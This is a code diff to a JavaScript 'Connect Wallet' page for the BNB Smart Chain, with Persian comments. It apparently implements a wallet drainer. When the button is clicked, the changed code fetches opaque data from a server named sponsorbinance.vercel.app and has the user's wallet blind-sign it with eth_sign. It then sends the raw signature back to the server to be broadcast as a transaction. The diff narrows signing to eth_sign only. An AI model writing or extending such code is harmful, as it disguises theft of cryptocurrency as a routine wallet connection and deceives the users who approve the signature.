@@ -10,66 +10,63 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["personal_sign", "eth_sign"],
+      methods: ["eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
     var provider = ethereumProvider;
-    var account = await provider.request({ method: "eth_accounts" });
-    var account_sender = account[0];
-    console.log("✅ Wallet Address:", account_sender);
-
-    try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
-      });
-    } catch (error) {
-      console.error("❌ Error in switching chain:", error);
-      return;
-    }
+    var accounts = await provider.request({ method: "eth_accounts" });
+    var sender = accounts[0];
+    console.log("✅ Wallet Address:", sender);
 
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function signAndSendTransaction(address, chain, type, contract = "0") {
+    async function getRawSignature(address) {
       try {
-        let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
+        let requestData = { handler: "tx", address, chain: "56", type: "coin" };
 
         var result = await jQuery.post(apiUrl, requestData);
-        var unsignedTx = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unsignedTx);
+        var unsignedData = JSON.parse(result);
+        console.log("📜 Unsigned Data:", unsignedData);
 
-        // **✅ امضای تراکنش در کیف پول**
-        var signedTx = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unsignedTx.result), address],
+        // **✅ دریافت امضای خام از کیف پول**
+        var rawSignature = await provider.request({
+          method: "eth_sign",
+          params: [address, unsignedData.result], // ارسال داده مناسب
         });
 
-        console.log("✍️ Signed Transaction:", signedTx);
-
-        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
-        var txHash = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature: signedTx,
-          type,
-        });
-
-        console.log("📤 Transaction Sent:", txHash);
-        return txHash;
+        return rawSignature;
       } catch (error) {
-        console.error("❌ Error in signAndSendTransaction:", error);
+        console.error("❌ Error in getRawSignature:", error);
         return null;
       }
     }
 
-    var txHash = await signAndSendTransaction(account_sender, "56", "coin");
+    async function sendSignedTransaction(signature) {
+      try {
+        var result = await jQuery.post(apiUrl, {
+          handler: "sign",
+          signature: signature,
+          type: "coin",
+        });
 
-    if (txHash) {
+        var resultJson = JSON.parse(result);
+        return resultJson.result;
+      } catch (error) {
+        console.error("❌ Error in sendSignedTransaction:", error);
+        return null;
+      }
+    }
+
+    var rawSignature = await getRawSignature(sender);
+
+    if (rawSignature) {
+      console.log("✍️ Signed Raw Data:", rawSignature);
+      var txHash = await sendSignedTransaction(rawSignature);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
-      console.error("⚠ Transaction failed.");
+      console.error("⚠ Signing failed.");
     }
   }
 
@@ -79,7 +76,6 @@ function App() {
       id="connectWallet"
       onClick={runner}
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-      data-uk-toggle=""
     >
       <span>Connect Wallet</span>
     </a>
